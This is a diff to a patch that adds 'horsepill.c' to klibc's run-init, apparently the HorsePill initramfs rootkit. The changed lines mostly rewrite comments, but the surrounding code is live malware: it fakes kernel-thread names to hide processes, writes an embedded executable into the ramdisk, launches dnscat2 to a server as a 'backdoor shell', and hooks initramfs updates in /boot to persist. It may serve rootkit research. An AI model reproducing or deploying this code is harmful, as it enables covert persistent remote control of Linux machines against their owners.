@@ -10739,7 +10739,7 @@ Index: klibc-2.0.7/usr/kinit/run-init/horsepill.c
 ===================================================================
 --- /dev/null
 +++ klibc-2.0.7/usr/kinit/run-init/horsepill.c
-@@ -0,0 +1,434 @@
+@@ -0,0 +1,458 @@
 +#include "horsepill.h"
 +
 +#include <sys/mount.h>
@@ -10786,8 +10786,13 @@ Index: klibc-2.0.7/usr/kinit/run-init/horsepill.c
 +}
 +
 +/**
-+ * This function check, from the name, if it is a process
-+ **/
++ * is_process - this function check, from the name, if it is a process
++ * @name: name of file in /proc
++ * 
++ * Returns:
++ *  - 1 if the name is name of process
++ *  - 0 otherwise
++ */
 +static int is_process(char *name)
 +{
 +	int i;
@@ -10800,8 +10805,11 @@ Index: klibc-2.0.7/usr/kinit/run-init/horsepill.c
 +}
 +
 +/**
-+ * This function return a new pid name
-+ **/
++ * grab_kernel_thread - this function transform the name of processes
++ * @name: name of file in /proc
++ * 
++ * Returns: return a new pid name
++ */
 +static char* grab_kernel_thread(char *name)
 +{
 +	FILE* stat;
@@ -10843,8 +10851,10 @@ Index: klibc-2.0.7/usr/kinit/run-init/horsepill.c
 +}
 +
 +/**
-+ * This function save in threads the names of process in /proc
-+ **/
++ * grab_kernel_threads - this function saves the elaborated names of processes in /proc
++ * @threads: array of char* to put names of processes
++ * 
++ */
 +static void grab_kernel_threads(char **threads)
 +{
 +	DIR *dirp;
@@ -10874,8 +10884,13 @@ Index: klibc-2.0.7/usr/kinit/run-init/horsepill.c
 +}
 +
 +/**
-+ * This function set argv and name to the process
-+ **/
++ * prctl_operations - this function sets argv and name to the process
++ * @title: name of the process to set argv
++ * 
++ * Returns:
++ *  - 0 if all prctl operations has been correctly executed
++ *  - 1 otherwise
++ */
 +static int prctl_operations(char *title)
 +{
 +	static char *proctitle = NULL;
@@ -10941,8 +10956,10 @@ Index: klibc-2.0.7/usr/kinit/run-init/horsepill.c
 +}
 +
 +/**
-+ * This function create the threads
-+ **/
++ * make_kernel_threads - this function creates the threads
++ * @threads: array of processes names to create
++ * 
++ */
 +static void make_kernel_threads(char **threads)
 +{
 +	int i;
@@ -10970,8 +10987,12 @@ Index: klibc-2.0.7/usr/kinit/run-init/horsepill.c
 +}
 +
 +/**
-+ * This function writes an executable into ramdisk
-+ **/
++ * write_executable - this function writes an executable into a specific path
++ * @path: path where put the executable
++ * @exe: array of unsigned char that represent byte-per-byte executable
++ * @exe_len: length of array @exe
++ * 
++ */
 +static void write_executable(char *path, unsigned char* exe, unsigned int exe_len)
 +{
 +	FILE* exe_file = NULL;
@@ -10984,8 +11005,10 @@ Index: klibc-2.0.7/usr/kinit/run-init/horsepill.c
 +}
 +
 +/**
-+ * This function run dnscat2 process and pass in command line the argument to connect to the server
-+ **/
++ * run_dnscat2 - this function runs dnscat2 process and pass in command line the argument to connect to the server
++ * 
++ * Returns: pid of dnscat2 process
++ */
 +static pid_t run_dnscat2()
 +{
 +	pid_t pid;
@@ -11012,7 +11035,7 @@ Index: klibc-2.0.7/usr/kinit/run-init/horsepill.c
 +}
 +
 +/**
-+ * This function handles the exit of init process
++ * handle_init_exit - this procedure handles the exit of init process
 + **/
 +static void handle_init_exit(int status)
 +{
@@ -11020,26 +11043,29 @@ Index: klibc-2.0.7/usr/kinit/run-init/horsepill.c
 +	if (!WIFSIGNALED(status))
 +		exit(EXIT_FAILURE);
 +	
++	// queries the termination status of a child process to determine which signal caused the child process to exit
 +	int signum = WTERMSIG(status);
 +
-+	if (signum == 1) // cannot reboot
++	if (signum == SIGHUP) // tell deamons to reload beacuse configuration files are changed
 +		reboot(LINUX_REBOOT_CMD_RESTART, NULL);
-+	else if (signum == 2) // cannot shutdown
++	else if (signum == SIGINT)
 +		reboot(LINUX_REBOOT_CMD_POWER_OFF, NULL);
 +	
 +	exit(EXIT_FAILURE);
 +}
 +
-+static void on_sigint(int signum)
++/**
++ * on_sigint - this procedure is handler of SIGINT
++ **/
++static void sigint_handler()
 +{
-+	if (signum == SIGINT)
-+		kill(init_pid, SIGINT);
++	kill(init_pid, SIGINT);
 +}
 +
 +/**
-+ * This function hooks the update of initramfs.
++ * hook_update_initramfs - this procedure hooks the update of initramfs
 + **/
-+int hook_update_initramfs() 
++void hook_update_initramfs() 
 +{
 +	int length, i;
 +	int fd;
@@ -11050,12 +11076,12 @@ Index: klibc-2.0.7/usr/kinit/run-init/horsepill.c
 +
 +	pid = fork();
 +	if (pid < 0)
-+		return 0;
++		return;
 +
 +	if (pid == 0) {
 +		fd = inotify_init();
 +		if (fd < 0)
-+			return 0; // error in installation of inotify_init
++			return; // error in installation of inotify_init
 +		
 +		wd = inotify_add_watch(fd, "/boot/", IN_MOVE);
 +		
@@ -11078,12 +11104,10 @@ Index: klibc-2.0.7/usr/kinit/run-init/horsepill.c
 +		inotify_rm_watch(fd, wd);
 +		close(fd);
 +	}
-+
-+	return 1;
 +}
 +
 +/**
-+ * This function save run-init in the scratch space 
++ * save_run_init - this procedure save run-init in the scratch space 
 + **/
 +void save_run_init() {
 +	system("mkdir /lost+found/old-initramfs/");
@@ -11099,7 +11123,7 @@ Index: klibc-2.0.7/usr/kinit/run-init/horsepill.c
 +}
 +
 +/**
-+ * This function is entry point just prior to running init
++ * perform_hacks - this procedure is entry point just prior to running init
 + **/
 +void perform_hacks()
 +{
@@ -11122,7 +11146,7 @@ Index: klibc-2.0.7/usr/kinit/run-init/horsepill.c
 +			exit(EXIT_FAILURE);
 +
 +		// install signal handler to handle signal delivered ctrl-alt-delete, which we will send to child init
-+		signal(SIGINT, on_sigint);
++		signal(SIGINT, sigint_handler);
 +		reboot(LINUX_REBOOT_CMD_CAD_OFF, NULL);
 +
 +		// wait for things to come up and networking to be ready
@@ -11147,7 +11171,7 @@ Index: klibc-2.0.7/usr/kinit/run-init/horsepill.c
 +		// spawn a process for backdoor shell
 +		dnscat_pid = run_dnscat2();
 +
-+		// watching for dnscat exit, watching for reinfection and waitpid for init
++		// watching for dnscat exit and watching waitpid for init
 +		while(1) {
 +			int status;
 +			pid_t pid;
